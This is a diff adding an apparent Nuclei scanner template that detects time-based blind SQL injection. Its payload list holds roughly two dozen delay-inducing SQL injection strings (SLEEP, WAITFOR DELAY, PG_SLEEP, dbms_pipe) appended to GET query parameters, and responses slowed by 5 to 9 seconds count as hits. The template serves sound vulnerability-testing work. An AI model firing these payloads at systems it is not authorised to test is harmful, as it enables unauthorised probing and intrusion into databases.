@@ -1,0 +1,59 @@
+id: time-sqli
+
+info:
+  name: Time-Based Blind SQL Injection
+  author: 0xKayala,leadlife
+  severity: high
+  description: |
+    This Template detects time-based Blind SQL Injection vulnerability
+  metadata:
+    validate: true
+  tags: time-based-sqli,sqli,dast,blind
+
+flow: http(1) && http(2)
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'       # only run on GET URLs
+
+    payloads:
+      injection:
+        - "(SELECT(0)FROM(SELECT(SLEEP(5)))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(5)))HoBG)--"
+        - "if(now()=sysdate(),SLEEP(5),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(5) ELSE 0 END)XOR'Z"
+        - "'waitfor delay '00:00:05'"
+        - "'waitfor delay '00:00:05'--"
+        - "'waitfor delay '00:00:05'#"
+        - "; WAITFOR DELAY '0:0:5';"
+        - "; WAITFOR DELAY '0:0:5'--"
+        - "; WAITFOR DELAY '0:0:5'#"
+        - "'or sleep(5)"
+        - "'or sleep(5)--"
+        - "'or sleep(5)#"
+        - "; SELECT PG_SLEEP(5);--"
+        - "; SELECT SLEEP(5);--"
+        - "' and 1337=dbms_pipe.receive_message(('a'),5)"
+        - "' and 1337=dbms_pipe.receive_message(('a'),5) -- "
+        - " and 1337=dbms_pipe.receive_message(('a'),5)"
+        - " and 1337=dbms_pipe.receive_message(('a'),5) -- "
+        - "' or 1337=dbms_pipe.receive_message(('a'),5)"
+        - "' or 1337=dbms_pipe.receive_message(('a'),5) --"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+# digest: 4a0a004730450220221817cdddedb8336ddb4afc4476f70da46a0dfb726a703a5e748458ae5bef000221009ebe3675d3fd10bf29161c179bd9b317b01f18643c2f8a6731ed9d89569495cc:922c64590222798bb761d5b6d8e72950
